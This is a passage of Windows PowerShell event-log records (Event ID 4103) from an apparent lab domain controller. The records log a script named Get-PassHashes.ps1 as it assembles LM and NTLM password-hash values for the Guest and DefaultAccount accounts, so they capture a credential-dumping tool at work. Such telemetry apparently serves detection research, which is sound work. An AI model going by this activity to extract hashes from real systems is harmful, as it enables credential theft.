Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount; id=503; lm=aad3b435b51404eeaad3b435b51404ee}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 132
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.586727600Z" />
    <EventRecordID>14247</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-f03a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 132
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount; id=503; lm=aad3b435b51404eeaad3b435b51404ee}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount; id=503}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 130
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.586524000Z" />
    <EventRecordID>14246</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-ef3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 130
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount; id=503}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="503"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 128
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.586272500Z" />
    <EventRecordID>14245</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-ee3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 128
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="503"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=DefaultAccount}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="DefaultAccount"
ParameterBinding(Add-Member): name="InputObject"; value=""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 126
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.586039900Z" />
    <EventRecordID>14244</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-ed3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 126
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="DefaultAccount"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 124
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.585691900Z" />
    <EventRecordID>14243</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-eb3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 124
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest; id=501; lm=aad3b435b51404eeaad3b435b51404ee}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 122
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.584691300Z" />
    <EventRecordID>14242</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e83a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 122
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest; id=501; lm=aad3b435b51404eeaad3b435b51404ee}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest; id=501}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 120
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.584250500Z" />
    <EventRecordID>14241</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e73a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 120
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest; id=501}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="501"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 118
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.584039200Z" />
    <EventRecordID>14240</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e63a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 118
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="501"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Guest}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="Guest"
ParameterBinding(Add-Member): name="InputObject"; value=""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 116
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.583798300Z" />
    <EventRecordID>14239</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e53a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 116
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="Guest"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 114
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.583181700Z" />
    <EventRecordID>14238</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e33a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 114
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
